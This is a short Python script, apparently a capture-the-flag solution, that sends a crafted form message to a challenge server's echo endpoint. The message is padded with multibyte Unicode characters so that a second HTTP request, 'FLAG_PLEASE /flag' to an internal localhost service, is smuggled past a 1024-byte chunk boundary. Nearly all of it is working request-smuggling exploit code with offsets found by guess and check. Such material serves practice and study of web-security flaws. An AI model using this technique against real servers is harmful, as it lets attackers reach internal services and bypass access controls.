import requests

url = 'http://ictf.maple3142.net:8888/echo'

rep = 71 # guess and check
# ǔ 2 bytes
# ἂ 3 bytes
# 𝓽 4 bytes
attack = '''1'''+ '''ǔ''' * rep + '''{}
FLAG_PLEASE /flag HTTP/1.1\r
Host: localhost:7777\r
Content-Length: 0\r
\r
'''
attack = attack.format('1' * (1024-rep+28 - len(attack))) # 28 is also from guess and check

chunk = min(1024, len(attack))
# chunk = 1024
print(chunk)
print(attack.encode()[:chunk])
print('=======')
print(attack.encode()[chunk:])

form = {
    'msg': attack
}

r = requests.post(url, data=form)
print(r.text)